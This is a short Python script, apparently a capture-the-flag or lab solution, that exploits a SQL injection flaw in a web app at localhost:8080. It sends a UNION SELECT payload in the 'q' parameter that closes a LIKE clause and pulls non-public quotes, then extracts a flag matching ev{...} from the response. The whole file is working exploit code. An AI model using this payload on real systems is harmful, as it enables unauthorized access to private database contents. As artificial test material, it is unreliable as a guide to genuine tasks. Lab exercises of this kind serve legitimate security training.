import requests
import re

def solve():
    """
    This script exploits a SQL injection vulnerability to retrieve a hidden flag.
    """
    # Hardcoded target URL as required
    base_url = "http://localhost:8080"
    
    # The endpoint is the root path
    endpoint = "/"
    
    # The full URL for the request
    url = base_url + endpoint

    # The SQL injection payload from the exploit plan
    # This payload is designed to bypass the is_public=1 check
    # %' closes the LIKE clause
    # UNION SELECT injects a new query
    # SELECT content FROM quotes WHERE is_public = 0 retrieves the hidden quote
    # -- comments out the rest of the original query
    payload = "%' UNION SELECT content FROM quotes WHERE is_public = 0 -- "
    
    # The parameters for the GET request, with the payload in 'q'
    params = {
        "q": payload
    }

    print(f"[*] Sending exploit to {url} with payload: {payload}")

    try:
        # Send the GET request with the malicious parameters
        # The plan specifies is_json_payload is false, so we use `params=` for GET query string
        response = requests.get(url, params=params)
        
        # Set encoding to prevent potential issues
        response.encoding = 'utf-8'

        # Print the full response text as required
        print("[*] Response from server:")
        print(response.text)

        # Use regex to find the flag in the response text
        # The flag format is ev{...}
        match = re.search(r"ev\{[a-zA-Z0-9_]+\}", response.text)
        
        if match:
            flag = match.group(0)
            print(f"\n[+] Exploit successful! Flag found: {flag}")
        else:
            print("\n[-] Exploit failed. Flag not found in the response.")

    except requests.exceptions.RequestException as e:
        print(f"[-] An error occurred while sending the request: {e}")

if __name__ == "__main__":
    solve()